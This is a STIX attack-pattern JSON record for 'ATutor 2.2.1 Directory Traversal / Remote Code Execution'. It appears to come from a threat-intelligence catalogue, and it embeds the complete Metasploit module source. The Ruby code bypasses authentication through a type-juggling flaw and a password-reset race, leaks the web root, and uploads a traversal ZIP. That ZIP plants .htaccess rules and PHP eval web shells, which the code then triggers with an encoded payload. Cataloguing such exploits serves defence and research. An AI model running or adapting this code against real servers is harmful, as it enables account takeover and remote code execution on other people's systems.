{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a7b8365-c856-4c50-a34e-64e8748642f4",
    "created": "2024-08-14T17:00:11.905454Z",
    "modified": "2024-08-14T17:00:11.905458Z",
    "name": "ATutor 2.2.1 Directory Traversal / Remote Code Execution",
    "description": " This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP setup with display_errors set to On, which can be used to allow us to upload a malicious ZIP file. On the web application, a blacklist verification is performed before extraction however it is not sufficient to prevent exploitation.  You are required to login to the target to reach the vulnerability, however this can be done as a student account and remote registration is enabled by default.  Just in case remote registration isn't enabled, this module uses 2 vulnerabilities in order to bypass the authentication:  1. confirm.php Authentication Bypass Type Juggling vulnerability 2. password_reminder.php Remote Password Reset TOCTOU vulnerability  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/atutor_filemanager_traversal.rb",
            "external_id": "atutor_filemanager_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/atutor/ATutor/pull/107"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ATutor 2.2.1 Directory Traversal / Remote Code Execution',\n        'Description' => %q{\n          This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP\n          setup with display_errors set to On, which can be used to allow us to upload a malicious\n          ZIP file. On the web application, a blacklist verification is performed before extraction,\n          however it is not sufficient to prevent exploitation.\n\n          You are required to login to the target to reach the vulnerability, however this can be\n          done as a student account and remote registration is enabled by default.\n\n          Just in case remote registration isn't enabled, this module uses 2 vulnerabilities\n          in order to bypass the authentication:\n\n          1. confirm.php Authentication Bypass Type Juggling vulnerability\n          2. password_reminder.php Remote Password Reset TOCTOU vulnerability\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'mr_me <steventhomasseeley[at]gmail.com>', # initial discovery, msf code\n          ],\n        'References' =>\n          [\n            [ 'URL', 'http://www.atutor.ca/' ], # Official Website\n            [ 'URL', 'http://sourceincite.com/research/src-2016-09/' ], # Type Juggling Advisory\n            [ 'URL', 'http://sourceincite.com/research/src-2016-10/' ], # TOCTOU Advisory\n            [ 'URL', 'http://sourceincite.com/research/src-2016-11/' ], # Directory Traversal Advisory\n            [ 'URL', 'https://github.com/atutor/ATutor/pull/107' ]\n          ],\n        'Privileged' => false,\n        'Payload' =>\n          {\n            'DisableNops' => true\n          },\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Targets' => [[ 'Automatic', {}]],\n        'DisclosureDate' => '2016-03-01',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of Atutor', '/ATutor/']),\n        OptString.new('USERNAME', [false, 'The username to authenticate as']),\n        OptString.new('PASSWORD', [false, 'The password to authenticate with'])\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def print_status(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg = '')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def check\n    # there is no real way to finger print the target so we just\n    # check if we can upload a zip and extract it into the web root...\n    # obviously not ideal, but if anyone knows better, feel free to change\n    unless datastore['USERNAME'] && datastore['PASSWORD']\n      # if we cant login, it may still be vuln\n      return Exploit::CheckCode::Unknown 'Check requires credentials. The target may still be vulnerable. If so, it may be possible to bypass authentication.'\n    end\n\n    student_cookie = login(datastore['USERNAME'], datastore['PASSWORD'], check = true)\n    if !student_cookie.nil? && disclose_web_root\n      begin\n        if upload_shell(student_cookie, check = true) && found\n          return Exploit::CheckCode::Vulnerable\n        end\n      rescue Msf::Exploit::Failed => e\n        vprint_error(e.message)\n      end\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n  def create_zip_file(check = false)\n    zip_file = Rex::Zip::Archive.new\n    @header = Rex::Text.rand_text_alpha_upper(4)\n    @payload_name = Rex::Text.rand_text_alpha_lower(4)\n    @archive_name = Rex::Text.rand_text_alpha_lower(3)\n    @test_string = Rex::Text.rand_text_alpha_lower(8)\n    # we traverse back into the webroot mods/ directory (since it will be writable)\n    path = \"../../../../../../../../../../../../..#{@webroot}mods/\"\n\n    # we use this to give us the best chance of success. If a webserver has htaccess override enabled\n    # we will win. If not, we may still win because these file extensions are often registered as php\n    # with the webserver, thus allowing us remote code execution.\n    if check\n      zip_file.add_file(\"#{path}#{@payload_name}.txt\", @test_string.to_s)\n    else\n      register_file_for_cleanup('.htaccess', \"#{@payload_name}.pht\", \"#{@payload_name}.php4\", \"#{@payload_name}.phtml\")\n      zip_file.add_file(\"#{path}.htaccess\", 'AddType application/x-httpd-php .phtml .php4 .pht')\n      zip_file.add_file(\"#{path}#{@payload_name}.pht\", \"<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>\")\n      zip_file.add_file(\"#{path}#{@payload_name}.php4\", \"<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>\")\n      zip_file.add_file(\"#{path}#{@payload_name}.phtml\", \"<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>\")\n    end\n    zip_file.pack\n  end\n\n  def found\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'mods', \"#{@payload_name}.txt\")\n    })\n    if res && (res.code == 200) && res.body =~ /#{@test_string}/\n      return true\n    end\n\n    return false\n  end\n\n  def disclose_web_root\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'jscripts', 'ATutor_js.php')\n    })\n    @webroot = '/'\n    @webroot << Regexp.last_match(1) if res && res.body =~ %r{\\<b\\>/(.*)jscripts/ATutor_js\\.php\\</b\\> }\n    if @webroot != '/'\n      return true\n    end\n\n    return false\n  end\n\n  def call_php(ext)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'mods', \"#{@payload_name}.#{ext}\"),\n      'raw_headers' => \"#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\\r\\n\"\n    }, timeout = 0.1)\n    return res\n  end\n\n  def exec_code\n    res = call_php('pht')\n    unless res\n      res = call_php('phtml')\n      unless res\n        call_php('php4')\n      end\n    end\n  end\n\n  def upload_shell(cookie, check)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(create_zip_file(check), 'application/zip', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{@archive_name}.zip\\\"\")\n    post_data.add_part(Rex::Text.rand_text_alpha_upper(4).to_s, nil, nil, 'form-data; name=\"submit_import\"')\n    data = post_data.to_s\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'mods', '_standard', 'tests', 'question_import.php'),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => cookie,\n      'vars_get' => {\n        'h' => ''\n      }\n    })\n    if res && res.code == 302 && res.redirection.to_s.include?('question_db.php')\n      return true\n    end\n\n    # unknown failure...\n    fail_with(Failure::Unknown, 'Unable to upload php code')\n    return false\n  end\n\n  def find_user(cookie)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'users', 'profile.php'),\n      'cookie' => cookie,\n      # we need to set the agent to the same value that was in type_juggle,\n      # since the bypassed session is linked to the user-agent. We can then\n      # use that session to leak the username\n      'agent' => ''\n    })\n    username = Regexp.last_match(1).to_s if res && res.body =~ %r{<span id=\"login\">(.*)</span>}\n    if username\n      return username\n    end\n\n    # else we fail, because we dont know the username to login as\n    fail_with(Failure::Unknown, 'Unable to find the username!')\n  end\n\n  def type_juggle\n    # high padding, means higher success rate\n    # also, we use numbers, so we can count requests :p\n    for i in 1..8\n      for @number in ('0' * i..'9' * i)\n        res = send_request_cgi({\n          'method' => 'POST',\n          'uri' => normalize_uri(target_uri.path, 'confirm.php'),\n          'vars_post' => {\n            'auto_login' => '',\n            'code' => '0' # type juggling\n          },\n          'vars_get' => {\n            'e' => @number, # the bruteforce\n            'id' => '',\n            'm' => '',\n            # the default install script creates a member\n            # so we know for sure, that it will be 1\n            'member_id' => '1'\n          },\n          # need to set the agent, since we are creating x number of sessions\n          # and then using that session to get leak the username\n          'agent' => ''\n        }, redirect_depth = 0) # to validate a successful bypass\n        if res && (res.code == 302)\n          cookie = \"ATutorID=#{Regexp.last_match(3)};\" if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*); ATutorID=(.*);/\n          return cookie\n        end\n      end\n    end\n    # if we finish the loop and have no sauce, we cant make pasta\n    fail_with(Failure::Unknown, 'Unable to exploit the type juggle and bypass authentication')\n  end\n\n  def reset_password\n    # this is due to line 79 of password_reminder.php\n    days = (Time.now.to_i / 60 / 60 / 24)\n    # make a semi strong password, we have to encourage security now :->\n    pass = Rex::Text.rand_text_alpha(32)\n    hash = Rex::Text.sha1(pass)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'password_reminder.php'),\n      'vars_post' => {\n        'form_change' => 'true',\n        # the default install script creates a member\n        # so we know for sure, that it will be 1\n        'id' => '1',\n        'g' => days + 1, # needs to be > the number of days since epoch\n        'h' => '', # not even checked!\n        'form_password_hidden' => hash, # remotely reset the password\n        'submit' => 'Submit'\n      }\n    }, redirect_depth = 0) # to validate a successful bypass\n\n    if res && (res.code == 302)\n      return pass\n    end\n\n    # if we land here, the TOCTOU failed us\n    fail_with(Failure::Unknown, 'Unable to exploit the TOCTOU and reset the password')\n  end\n\n  def login(username, password, check = false)\n    hash = Rex::Text.sha1(Rex::Text.sha1(password))\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.php'),\n      'vars_post' => {\n        'form_password_hidden' => hash,\n        'form_login' => username,\n        'submit' => 'Login',\n        'token' => ''\n      }\n    })\n    # poor php developer practices\n    cookie = \"ATutorID=#{Regexp.last_match(4)};\" if res && res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*); ATutorID=(.*); ATutorID=(.*);/\n    if res && res.code == 302\n      if res.redirection.to_s.include?('bounce.php?course=0')\n        return cookie\n      end\n    end\n    # auth failed if we land here, bail\n    unless check\n      fail_with(Failure::NoAccess, \"Authentication failed with username #{username}\")\n    end\n    return nil\n  end\n\n  def exploit\n    # login if needed\n    if datastore['USERNAME'] && datastore['PASSWORD']\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n      student_cookie = login(datastore['USERNAME'], datastore['PASSWORD'])\n      print_good(\"Logged in as #{datastore['USERNAME']}\")\n    # else, we reset the students password via a type juggle vulnerability\n    else\n      print_status('Account details are not set, bypassing authentication...')\n      print_status('Triggering type juggle attack...')\n      student_cookie = type_juggle\n      print_good(\"Successfully bypassed the authentication in #{@number} requests !\")\n      username = find_user(student_cookie)\n      print_good(\"Found the username: #{username} !\")\n      password = reset_password\n      print_good(\"Successfully reset the #{username}'s account password to #{password} !\")\n      report_cred(user: username, password: password)\n      student_cookie = login(username, password)\n      print_good(\"Logged in as #{username}\")\n    end\n\n    if disclose_web_root\n      print_good('Found the webroot')\n      # we got everything. Now onto pwnage\n      if upload_shell(student_cookie, false)\n        print_good('Zip upload successful !')\n        exec_code\n      end\n    end\n  end\nend\n\ndef service_details\n  super.merge({ post_reference_name: refname })\nend\n",
    "x_mitre_disclosure_date": "2016-03-01",
    "x_mitre_platforms": [
        "['php']"
    ]
}